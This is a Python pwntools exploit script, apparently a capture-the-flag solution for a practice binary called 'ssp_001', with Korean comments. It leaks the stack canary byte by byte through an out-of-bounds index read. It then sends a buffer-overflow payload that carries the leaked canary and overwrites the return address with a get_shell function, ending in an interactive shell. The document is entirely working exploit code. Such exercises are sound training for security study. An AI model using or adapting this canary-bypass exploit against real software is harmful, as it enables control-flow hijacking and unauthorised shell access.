from pwn import *

context.log_level = 'debug'
context.arch = 'i386'


def start():
    if args.REMOTE:
        host=''
        port=0
        return remote(host,port)
    else:
        return process("./ssp_001")
p = start()

cnry= b'\x00'

for input in [129,130,131]:
    p.sendlineafter(b'> ',b'P')
    p.sendlineafter(b'Element index : ',str(input))
    p.recvuntil(b'is : ')
    byte= int(p.recvn(2),16)    #16진수 2글자
    cnry += bytes([byte])   #1바이트 객체로 변환


#페이로드 작성
payload = b'a'*0x40 #name변수 패딩
payload += cnry     #카나리 바이트 사용
payload += b'b'*0x08#edi ebp 패딩
payload += p32(0x080486b9)#get_shell 주소 리틀엔디안으로

p.sendlineafter(b'> ',b'E')
p.sendlineafter(b"Name Size : ", b'80')
p.sendlineafter(b'Name : ',payload)

p.interactive()
